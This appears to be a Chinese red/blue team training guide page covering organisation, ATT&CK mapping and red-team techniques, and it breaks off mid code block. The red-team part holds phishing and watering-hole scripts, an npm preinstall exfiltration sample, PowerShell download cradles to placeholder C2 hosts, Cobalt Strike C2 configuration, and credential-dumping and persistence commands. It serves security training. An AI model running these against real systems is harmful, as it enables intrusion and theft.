@@ -1,0 +1,3368 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>红蓝对抗完整学习指南 - 开发</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../theme/pagetoc.css">
+        <link rel="stylesheet" href="../../theme/help-overlay.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">开发</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="搜索本书内容..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <!-- Page table of contents -->
+                        <div class="sidetoc"><nav class="pagetoc"></nav></div>
+
+                        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css">
+<h1 id="红蓝对抗完整学习指南"><a class="header" href="#红蓝对抗完整学习指南">红蓝对抗完整学习指南</a></h1>
+<h2 id="-学习路线图"><a class="header" href="#-学习路线图">📋 学习路线图</a></h2>
+<pre><code>基础理论(2周) → 红队技术(6周) → 蓝队技术(6周) → 紫队协同(2周) → 演练实战(4周) → 高级对抗(持续)
+</code></pre>
+<h2 id="-法律声明与职业道德"><a class="header" href="#-法律声明与职业道德">⚖️ 法律声明与职业道德</a></h2>
+<blockquote>
+<p><strong>严正声明</strong>: 所有红蓝对抗活动必须在合法授权的框架内进行！</p>
+</blockquote>
+<h3 id="合法场景"><a class="header" href="#合法场景">合法场景</a></h3>
+<ul>
+<li>✅ 企业授权的攻防演练</li>
+<li>✅ 正规的红蓝对抗竞赛</li>
+<li>✅ 安全测试与评估项目</li>
+<li>✅ 内部安全培训演练</li>
+</ul>
+<h3 id="严格禁止"><a class="header" href="#严格禁止">严格禁止</a></h3>
+<ul>
+<li>❌ 未授权的攻击测试</li>
+<li>❌ 破坏性攻击行为</li>
+<li>❌ 数据窃取和泄露</li>
+<li>❌ 勒索和敲诈行为</li>
+</ul>
+<hr />
+<h2 id="模块一对抗基础与组织建设"><a class="header" href="#模块一对抗基础与组织建设">模块一：对抗基础与组织建设</a></h2>
+<h3 id="模块总览定位与输出"><a class="header" href="#模块总览定位与输出">模块总览（定位与输出）</a></h3>
+<ul>
+<li><strong>学习目标</strong>：建立对红蓝对抗的整体认知，理解组织架构、角色分工、流程规范及合规要求，为后续模块奠定统一标准。</li>
+<li><strong>达成指标</strong>：能够设计企业级红蓝对抗计划，绘制组织协作关系图，制定授权合约与安全基线清单，完成一次演练前评估。</li>
+<li><strong>关键产出</strong>：
+<ul>
+<li>对抗组织架构图（红/蓝/白/紫队职责矩阵）</li>
+<li>授权文档模板、风险评估表、通信手册</li>
+<li>对抗成熟度自检表与推进路线图</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>推荐节奏：</p>
+<ul>
+<li>第1周：法律伦理、组织架构、角色RACI梳理。</li>
+<li>第2周：演练流程、风险控制、度量指标设计。</li>
+<li>第3周：完成授权流程模拟、成熟度评估与改进计划。</li>
+</ul>
+</blockquote>
+<h4 id="能力成熟度模型capability-maturity-model"><a class="header" href="#能力成熟度模型capability-maturity-model">能力成熟度模型（Capability Maturity Model）</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>等级</th><th>描述</th><th>关键特征</th><th>需解决的问题</th></tr></thead><tbody>
+<tr><td>Level 1 应急型</td><td>无正式流程，依靠个人经验</td><td>临时拉通沟通、缺乏规范</td><td>授权流程缺失、影响不可控</td></tr>
+<tr><td>Level 2 计划型</td><td>有基础计划与清单</td><td>形成演练计划、指定负责人</td><td>测试范围模糊、证据管理薄弱</td></tr>
+<tr><td>Level 3 体系型</td><td>建立全流程SOP与工具链</td><td>统一模板、自动化记录、定期演练</td><td>指标体系不完善、协同效率有待提升</td></tr>
+<tr><td>Level 4 优化型</td><td>数据驱动持续改进</td><td>威胁情报驱动、防御及时迭代</td><td>缺乏攻防知识库与经验沉淀</td></tr>
+<tr><td>Level 5 智能型</td><td>攻防一体化、自动化对抗</td><td>AIOps辅助检测、紫队常态化</td><td>需要跨部门安全治理与生态合作</td></tr>
+</tbody></table>
+</div>
+<h4 id="前置自检before-action-checklist"><a class="header" href="#前置自检before-action-checklist">前置自检（Before-Action Checklist）</a></h4>
+<ul>
+<li><input disabled="" type="checkbox"/>
+是否拥有经过法务审核的授权书、责任豁免书？</li>
+<li><input disabled="" type="checkbox"/>
+是否建立红/蓝/白/紫队联系人清单及24小时通信机制？</li>
+<li><input disabled="" type="checkbox"/>
+是否确认演练环境隔离策略、回滚机制、资源保障计划？</li>
+<li><input disabled="" type="checkbox"/>
+是否完成关键资产、业务、供应链的优先级排序？</li>
+<li><input disabled="" type="checkbox"/>
+是否制定演练中断与应急升级流程？</li>
+</ul>
+<h3 id="11-核心概念"><a class="header" href="#11-核心概念">1.1 核心概念</a></h3>
+<h4 id="红蓝对抗定义"><a class="header" href="#红蓝对抗定义">红蓝对抗定义</a></h4>
+<p><strong>红蓝对抗</strong>是一种模拟真实攻击场景的网络安全演练方式，通过红队（攻击方）、蓝队（防守方）、白队（裁判方）三方对抗，全面检验企业安全防护能力。</p>
+<p><strong>核心价值</strong>:</p>
+<pre><code>1. 检验防御体系有效性
+2. 发现安全盲点和弱点
+3. 提升安全团队实战能力
+4. 完善应急响应流程
+5. 建立安全文化意识
+</code></pre>
+<h4 id="团队角色定位"><a class="header" href="#团队角色定位">团队角色定位</a></h4>
+<p><strong>红队（Red Team）</strong>:</p>
+<pre><code>职责:
+- 模拟真实攻击者行为
+- 突破防御体系
+- 窃取敏感数据
+- 建立持久化控制
+
+目标:
+- 发现安全弱点
+- 测试检测能力
+- 评估响应效率
+</code></pre>
+<p><strong>蓝队（Blue Team）</strong>:</p>
+<pre><code>职责:
+- 监控网络流量
+- 检测异常行为
+- 响应安全事件
+- 加固防御体系
+
+目标:
+- 及时发现攻击
+- 快速响应处置
+- 最小化影响
+- 持续改进防御
+</code></pre>
+<p><strong>白队（White Team）</strong>:</p>
+<pre><code>职责:
+- 制定演练规则
+- 监督演练过程
+- 评估攻防效果
+- 协调双方冲突
+
+目标:
+- 确保演练安全
+- 公正评判结果
+- 总结经验教训
+</code></pre>
+<p><strong>紫队（Purple Team）</strong>:</p>
+<pre><code>职责:
+- 协调红蓝双方
+- 共享攻击技术
+- 优化防御策略
+- 知识传递培训
+
+目标:
+- 提升整体安全能力
+- 促进协作沟通
+- 持续安全改进
+</code></pre>
+<h4 id="角色职责矩阵raci"><a class="header" href="#角色职责矩阵raci">角色职责矩阵（RACI）</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>工作包</th><th>红队</th><th>蓝队</th><th>白队</th><th>紫队</th></tr></thead><tbody>
+<tr><td>演练范围制定</td><td>A</td><td>C</td><td>R</td><td>I</td></tr>
+<tr><td>授权与合规评审</td><td>C</td><td>C</td><td>A/R</td><td>I</td></tr>
+<tr><td>侦察与攻击执行</td><td>R</td><td>I</td><td>C</td><td>A</td></tr>
+<tr><td>检测与响应</td><td>I</td><td>A/R</td><td>C</td><td>C</td></tr>
+<tr><td>当日复盘会议</td><td>R</td><td>R</td><td>A</td><td>C</td></tr>
+<tr><td>演练报告交付</td><td>C</td><td>C</td><td>A/R</td><td>R</td></tr>
+<tr><td>知识库更新</td><td>C</td><td>C</td><td>I</td><td>A</td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p><strong>说明</strong>：A=Accountable（最终负责），R=Responsible（执行），C=Consulted（咨询），I=Informed（知情）。</p>
+</blockquote>
+<h4 id="对抗沟通手册communication-runbook"><a class="header" href="#对抗沟通手册communication-runbook">对抗沟通手册（Communication Runbook）</a></h4>
+<ul>
+<li><strong>日常同步</strong>：每日固定时间召开“攻防例会”，红队汇报攻击进展，蓝队分享检测响应，白队记录行动项。</li>
+<li><strong>重大告警</strong>：若出现业务影响或敏感资产访问，需在5分钟内通过应急群（IM+电话）通知所有责任人，并同步执行停止条件评估。</li>
+<li><strong>证据提交流程</strong>：红队上传攻击证据至加密存储（只读权限），蓝队同步检测日志，白队牵头编号、标记敏感级别并定期备份。</li>
+<li><strong>影响评估流程</strong>：白队牵头组织业务负责人、IT、红蓝代表召开快速评估会，确定是否进入应急模式或调整范围。</li>
+<li><strong>保密约定</strong>：演练细节仅限授权范围人员知晓，必要时签署NDA，白队负责审计访问日志和资料销毁计划。</li>
+</ul>
+<h3 id="12-攻防演练参考框架"><a class="header" href="#12-攻防演练参考框架">1.2 攻防演练参考框架</a></h3>
+<h4 id="mitre-attck框架"><a class="header" href="#mitre-attck框架">MITRE ATT&amp;CK框架</a></h4>
+<p><strong>战术矩阵（14个战术阶段）</strong>:</p>
+<pre><code>初始访问 (Initial Access)
+├── 钓鱼攻击
+├── 供应链攻击
+├── 外部服务利用
+└── 有效账户
+
+执行 (Execution)
+├── 命令和脚本解释器
+├── 用户执行
+├── 计划任务
+└── 系统服务
+
+持久化 (Persistence)
+├── 账户操纵
+├── 启动文件夹
+├── 计划任务
+└── 服务创建
+
+权限提升 (Privilege Escalation)
+├── 进程注入
+├── 访问令牌操纵
+├── 提升权限
+└── 滥用特权
+
+防御规避 (Defense Evasion)
+├── 混淆文件/信息
+├── 卸载安全软件
+├── 进程隐藏
+└── 虚拟化检测规避
+
+凭证访问 (Credential Access)
+├── 凭证转储
+├── 暴力破解
+├── 键盘记录
+└── 网络嗅探
+
+发现 (Discovery)
+├── 系统信息发现
+├── 网络配置发现
+├── 账户发现
+└── 远程系统发现
+
+横向移动 (Lateral Movement)
+├── 远程服务
+├── 内部钓鱼
+├── 共享资源利用
+└── Windows远程管理
+
+收集 (Collection)
+├── 数据收集
+├── 屏幕截图
+├── 音频捕获
+└── 剪贴板数据
+
+命令与控制 (Command and Control)
+├── 应用层协议
+├── 加密通道
+├── 非标准端口
+└── 域名生成算法
+
+渗出 (Exfiltration)
+├── 通过C2通道
+├── 通过替代协议
+├── 数据压缩
+└── 自动化渗出
+
+影响 (Impact)
+├── 数据加密
+├── 数据破坏
+├── 服务停止
+└── 资源劫持
+</code></pre>
+<p><strong>实战应用</strong>:</p>
+<pre><code class="language-python"># ATT&amp;CK技术映射脚本
+class ATTACKMapping:
+    def __init__(self):
+        self.techniques = {
+            'T1566': {  # Phishing
+                'tactic': 'Initial Access',
+                'name': '钓鱼攻击',
+                'detection': [
+                    '邮件网关监控',
+                    '用户行为分析',
+                    '附件沙箱检测'
+                ],
+                'mitigation': [
+                    '安全意识培训',
+                    'DMARC配置',
+                    '邮件过滤规则'
+                ]
+            },
+            'T1003': {  # OS Credential Dumping
+                'tactic': 'Credential Access',
+                'name': '凭证转储',
+                'detection': [
+                    'LSASS进程监控',
+                    '注册表监控',
+                    '异常工具检测'
+                ],
+                'mitigation': [
+                    'LSA保护',
+                    'Credential Guard',
+                    '最小权限原则'
+                ]
+            }
+        }
+
+    def map_red_team_action(self, action_log):
+        """
+        将红队行动映射到ATT&amp;CK技术
+        """
+        mapped_techniques = []
+        for action in action_log:
+            if 'mimikatz' in action.lower():
+                mapped_techniques.append('T1003')
+            elif 'phish' in action.lower():
+                mapped_techniques.append('T1566')
+        return mapped_techniques
+
+    def generate_blue_team_playbook(self, techniques):
+        """
+        生成蓝队应对手册
+        """
+        playbook = []
+        for tech_id in techniques:
+            if tech_id in self.techniques:
+                tech = self.techniques[tech_id]
+                playbook.append({
+                    'technique': tech['name'],
+                    'detection_methods': tech['detection'],
+                    'mitigation_steps': tech['mitigation']
+                })
+        return playbook
+</code></pre>
+<hr />
+<h2 id="模块二红队作战体系"><a class="header" href="#模块二红队作战体系">模块二：红队作战体系</a></h2>
+<h3 id="模块总览红队视角"><a class="header" href="#模块总览红队视角">模块总览（红队视角）</a></h3>
+<ul>
+<li><strong>核心目标</strong>：掌握现代红队从侦察、武器化、投递、执行到行动维持的完整链路，能够根据不同企业场景制定可控、可复现的攻击剧本。</li>
+<li><strong>关键能力点</strong>：
+<ul>
+<li>Kill Chain 对齐：Recon → Initial Access → Privilege Escalation → Lateral Movement → Action on Objective。</li>
+<li>工具与自研结合：熟悉主流C2平台、脚本框架与自研模块，具备快速定制能力。</li>
+<li>隐蔽与对抗：掌握流量混淆、特征规避、日志清洗等隐蔽技巧。</li>
+</ul>
+</li>
+<li><strong>交付清单</strong>：红队作战手册、攻击路径图、POC/EXP代码库、风险评估与缓解建议、证据归集表。</li>
+</ul>
+<h4 id="红队作战基线red-team-baseline"><a class="header" href="#红队作战基线red-team-baseline">红队作战基线（Red Team Baseline）</a></h4>
+<div class="table-wrapper"><table><thead><tr><th>维度</th><th>基础要求</th><th>进阶要求</th><th>专家要求</th></tr></thead><tbody>
+<tr><td>情报准备</td><td>资产指纹、漏洞情报列表</td><td>融合威胁情报、行业案例</td><td>构建情报管道、分析对手TTP</td></tr>
+<tr><td>C2基础设施</td><td>单节点C2、HTTP通道</td><td>多节点C2、混合协议、域前置</td><td>动态域前置、CDN混淆、Cloud C2</td></tr>
+<tr><td>工具链</td><td>熟悉公开工具、掌握配置</td><td>定制Payload、脚本化流程</td><td>自研框架、反溯源机制</td></tr>
+<tr><td>隐蔽性</td><td>基础混淆、日志清理</td><td>流量伪装、证据最小化</td><td>对抗EDR/IPS、反指纹追踪</td></tr>
+<tr><td>复盘能力</td><td>简单报告</td><td>链路复盘+影响评估</td><td>数据驱动攻防指标、灰盒验证</td></tr>
+</tbody></table>
+</div>
+<blockquote>
+<p><strong>提示</strong>：红队必须遵守“可控性”“可回滚”“可审计”三大原则，演练中对每个高危步骤设置“安全阈值”与“紧急按钮”。</p>
+</blockquote>
+<h3 id="21-初始访问技术"><a class="header" href="#21-初始访问技术">2.1 初始访问技术</a></h3>
+<h4 id="钓鱼攻击phishing"><a class="header" href="#钓鱼攻击phishing">钓鱼攻击（Phishing）</a></h4>
+<p><strong>邮件钓鱼</strong>:</p>
+<pre><code class="language-python"># 钓鱼邮件生成脚本（仅用于授权演练）
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+class PhishingCampaign:
+    def __init__(self, smtp_server, smtp_port):
+        self.smtp_server = smtp_server
+        self.smtp_port = smtp_port
+
+    def create_template(self, target_name, company):
+        """
+        创建个性化钓鱼邮件模板
+        """
+        template = f"""
+        尊敬的{target_name}，
+
+        您的{company}账户需要验证。请点击以下链接完成验证：
+
+        https://phishing-domain.com/verify?user={target_name}
+
+        此链接将在24小时后失效。
+
+        {company}安全团队
+        """
+        return template
+
+    def attach_malicious_macro(self, filename):
+        """
+        附加恶意宏文档（演练用）
+        """
+        # 生成包含宏的Office文档
+        # 实际代码略，需要使用python-docx等库
+        pass
+
+    def track_email_open(self, email_id):
+        """
+        跟踪邮件打开情况
+        """
+        tracking_pixel = f'&lt;img src="https://tracker.com/pixel.gif?id={email_id}" width="1" height="1" /&gt;'
+        return tracking_pixel
+
+# Gophish钓鱼平台使用
+"""
+1. 安装Gophish
+wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
+unzip gophish-v0.12.1-linux-64bit.zip
+./gophish
+
+2. 访问管理界面
+https://localhost:3333
+
+3. 创建钓鱼活动
+- 用户组：导入目标邮箱列表
+- 邮件模板：设计钓鱼邮件
+- 着陆页：克隆真实登录页面
+- 发送配置：SMTP服务器设置
+
+4. 监控结果
+- 邮件发送状态
+- 打开率
+- 点击率
+- 凭证提交率
+"""
+</code></pre>
+<p><strong>水坑攻击（Watering Hole）</strong>:</p>
+<pre><code class="language-javascript">// 水坑攻击植入脚本
+(function() {
+    // 检测目标用户
+    var targetCompany = 'target-company.com';
+    var userDomain = document.referrer;
+
+    if (userDomain.includes(targetCompany)) {
+        // 加载恶意载荷
+        var script = document.createElement('script');
+        script.src = 'https://malicious-cdn.com/payload.js';
+        document.head.appendChild(script);
+
+        // 信息收集
+        var info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            cookies: document.cookie,
+            referrer: document.referrer
+        };
+
+        // 回传信息
+        fetch('https://c2-server.com/collect', {
+            method: 'POST',
+            body: JSON.stringify(info)
+        });
+    }
+})();
+</code></pre>
+<h4 id="供应链攻击"><a class="header" href="#供应链攻击">供应链攻击</a></h4>
+<p><strong>软件供应链入侵</strong>:</p>
+<pre><code class="language-bash"># npm包投毒示例（仅用于理解原理）
+# package.json
+{
+  "name": "popular-package-typo",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "node malicious-script.js"
+  }
+}
+
+# malicious-script.js
+const https = require('https');
+const os = require('os');
+
+// 收集系统信息
+const systemInfo = {
+    hostname: os.hostname(),
+    platform: os.platform(),
+    arch: os.arch(),
+    user: process.env.USER || process.env.USERNAME,
+    cwd: process.cwd()
+};
+
+// 回传到C2服务器
+const data = JSON.stringify(systemInfo);
+const options = {
+    hostname: 'c2-server.com',
+    port: 443,
+    path: '/collect',
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': data.length
+    }
+};
+
+const req = https.request(options);
+req.write(data);
+req.end();
+</code></pre>
+<h3 id="攻击链策划工作坊kill-chain-workshop"><a class="header" href="#攻击链策划工作坊kill-chain-workshop">攻击链策划工作坊（Kill Chain Workshop）</a></h3>
+<ol>
+<li><strong>情报收敛</strong>：结合Shodan、Fofa、Git泄露、人员社交媒体、招聘信息确定技术栈与潜在入口。</li>
+<li><strong>入口排列</strong>：依据攻击收益、投入成本、被发现概率打分，形成“入口优先级矩阵（价值 × 隐蔽 × 成本）”。</li>
+<li><strong>行动脚本</strong>：为每个入口编写行动脚本，包含前提条件、工具、命令、回滚步骤、可能触发的告警点。</li>
+<li><strong>安全阀设置</strong>：定义每个阶段的潜在影响（业务、数据、舆情），一旦触发阈值立即通知白队评估是否中止。</li>
+<li><strong>证据策略</strong>：全程使用加密日志、自定义脚本自动记录命令、时间戳、目标，确保回溯性。</li>
+</ol>
+<blockquote>
+<p>建议利用白板或Miro绘制攻击链图（Chain of Attack），标注对应的MITRE技术编号与蓝队预期告警点。</p>
+</blockquote>
+<h3 id="22-执行技术"><a class="header" href="#22-执行技术">2.2 执行技术</a></h3>
+<h4 id="powershell攻击"><a class="header" href="#powershell攻击">PowerShell攻击</a></h4>
+<p><strong>无文件攻击（Fileless Attack）</strong>:</p>
+<pre><code class="language-powershell"># 内存执行PowerShell脚本
+IEX (New-Object Net.WebClient).DownloadString('http://c2-server.com/payload.ps1')
+
+# Base64编码执行
+$command = 'IEX (New-Object Net.WebClient).DownloadString("http://c2-server.com/payload.ps1")'
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+powershell.exe -EncodedCommand $encodedCommand
+
+# Empire框架使用
+"""
+# 安装Empire
+git clone https://github.com/EmpireProject/Empire.git
+cd Empire
+./setup/install.sh
+./empire
+
+# 创建监听器
+(Empire) &gt; listeners
+(Empire: listeners) &gt; uselistener http
+(Empire: listeners/http) &gt; set Host http://192.168.1.100
+(Empire: listeners/http) &gt; set Port 8080
+(Empire: listeners/http) &gt; execute
+
+# 生成Launcher
+(Empire: listeners) &gt; launcher powershell http
+(Empire: listeners) &gt; usestager windows/launcher_bat
+(Empire: stager/windows/launcher_bat) &gt; set Listener http
+(Empire: stager/windows/launcher_bat) &gt; execute
+
+# 后渗透模块
+(Empire: agents) &gt; usemodule privesc/powerup/allchecks
+(Empire: agents) &gt; usemodule credentials/mimikatz/logonpasswords
+(Empire: agents) &gt; usemodule lateral_movement/invoke_psremoting
+"""
+</code></pre>
+<p><strong>混淆技术</strong>:</p>
+<pre><code class="language-powershell"># Invoke-Obfuscation工具
+Import-Module .\Invoke-Obfuscation.psd1
+Invoke-Obfuscation
+
+# 加载脚本
+SET SCRIPTBLOCK IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+
+# Token混淆
+TOKEN
+ALL
+1
+
+# 字符串混淆
+STRING
+1
+
+# 编码混淆
+ENCODING
+1
+
+# 查看混淆结果
+OUT obfuscated.ps1
+</code></pre>
+<h4 id="cobalt-strike使用"><a class="header" href="#cobalt-strike使用">Cobalt Strike使用</a></h4>
+<p><strong>Beacon配置</strong>:</p>
+<pre><code class="language-bash"># 启动团队服务器
+./teamserver [external IP] [password] [/path/to/malleable-c2-profile]
+
+# Malleable C2 Profile配置
+set sample_name "Custom Profile";
+
+set sleeptime "60000";
+set jitter    "20";
+
+http-get {
+    set uri "/api/v1/status";
+
+    client {
+        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+        header "Accept" "application/json";
+
+        metadata {
+            base64url;
+            prepend "session=";
+            header "Cookie";
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json";
+        header "Server" "nginx/1.18.0";
+
+        output {
+            base64url;
+            prepend "{\"status\":\"ok\",\"data\":\"";
+            append "\"}";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/api/v1/update";
+
+    client {
+        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
+        header "Content-Type" "application/json";
+
+        id {
+            base64url;
+            prepend "{\"id\":\"";
+            append "\",";
+        }
+
+        output {
+            base64url;
+            prepend "\"data\":\"";
+            append "\"}";
+            print;
+        }
+    }
+
+    server {
+        header "Content-Type" "application/json";
+
+        output {
+            base64url;
+            prepend "{\"response\":\"";
+            append "\"}";
+            print;
+        }
+    }
+}
+</code></pre>
+<h4 id="c2基础设施蓝图"><a class="header" href="#c2基础设施蓝图">C2基础设施蓝图</a></h4>
+<pre><code>┌──────────────────────────────────────────────┐
+│   外部基础设施 (Cloud / VPS)                │
+│   ┌──────────────┐   ┌──────────────────┐    │
+│   │ Redirector A │--&gt;| CDN / WAF / NLB  │----┐│
+│   └──────────────┘   └──────────────────┘    ││
+│                │            │                ││
+│   ┌──────────────┐   ┌──────────────┐        ││
+│   │ Redirector B │   │ Redirector C │        ││
+│   └──────────────┘   └──────────────┘        ││
+│                │            │                ││
+└────────────────┴────────────┴────────────────┘│
+                 │            │                 │
+       ┌────────────────────────────────┐       │
+       │ 内部C2核心 (Team Server/VPS)   │&lt;───────┘
+       │  - 正式Beacon监听端口         │
+       │  - 操作员VPN/Jump主机         │
+       │  - 日志与证据存储             │
+       └────────────────────────────────┘
+                 │
+      ┌─────────────────────┐
+      │ 操作员工作站 (OPSEC)│
+      │  - 隔离网络         │
+      │  - 多因子认证       │
+      │  - 工具白名单       │
+      └─────────────────────┘
+</code></pre>
+<p><strong>设计原则</strong>：</p>
+<ul>
+<li>使用多跳反向代理与CDN隐藏真实C2地址，结合域前置或SNI伪装；</li>
+<li>Redirector 与核心C2分离，出现封禁可快速替换；</li>
+<li>通过WireGuard/OpenVPN管理平面访问，所有命令经由堡垒机审计；</li>
+<li>C2服务采用容器化或基础设施即代码（Terraform/Ansible）快速部署与销毁；</li>
+<li>建立“操作员手册”：包括上线审批、命令审批、证据同步、回滚步骤。</li>
+</ul>
+<p><strong>后渗透操作</strong>:</p>
+<pre><code class="language-bash"># Beacon命令
+beacon&gt; shell whoami
+beacon&gt; getuid
+beacon&gt; ps
+beacon&gt; screenshot
+
+# 权限提升
+beacon&gt; elevate svc-exe tcp-local
+beacon&gt; getsystem
+
+# 凭证获取
+beacon&gt; hashdump
+beacon&gt; logonpasswords
+beacon&gt; mimikatz !sekurlsa::logonpasswords
+
+# 横向移动
+beacon&gt; jump psexec target.com LISTENER
+beacon&gt; jump winrm target.com LISTENER
+beacon&gt; remote-exec psexec target.com whoami
+
+# 持久化
+beacon&gt; run persistence
+beacon&gt; schtasks /create /tn "WindowsUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru System
+
+# 隧道建立
+beacon&gt; socks 1080
